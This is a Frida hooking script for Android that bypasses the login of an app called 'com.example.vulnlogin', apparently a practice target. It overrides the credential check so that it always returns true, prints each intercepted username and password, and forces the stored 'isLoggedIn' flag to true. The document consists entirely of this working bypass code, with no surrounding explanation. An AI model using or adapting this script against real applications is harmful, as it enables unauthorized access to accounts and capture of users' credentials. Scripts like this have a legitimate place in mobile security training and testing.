Java.perform(function() {
    console.log("[+] Login Bypass Script Started");
    
    // Hook the LoginActivity class
    var LoginActivity = Java.use("com.example.vulnlogin.LoginActivity");
    
    // Bypass validateCredentials method
    LoginActivity.validateCredentials.implementation = function(username, password) {
        console.log("[+] Intercepted login attempt");
        console.log("[+] Username: " + username);
        console.log("[+] Password: " + password);
        console.log("[+] Bypassing authentication...");
        
        // Always return true to bypass authentication
        return true;
    };
    
    // Hook the onLoginSuccess method to ensure proper flow
    LoginActivity.onLoginSuccess.implementation = function() {
        console.log("[+] Login success method called - bypass successful!");
        this.onLoginSuccess();
    };
    
    // Hook SharedPreferences to manipulate session data
    var SharedPreferences = Java.use("android.content.SharedPreferences");
    var Editor = Java.use("android.content.SharedPreferences$Editor");
    
    Editor.putBoolean.overload('java.lang.String', 'boolean').implementation = function(key, value) {
        if (key === "isLoggedIn") {
            console.log("[+] Setting isLoggedIn to true");
            return this.putBoolean(key, true);
        }
        return this.putBoolean(key, value);
    };
    
    console.log("[+] All hooks installed - ready to bypass login");
});
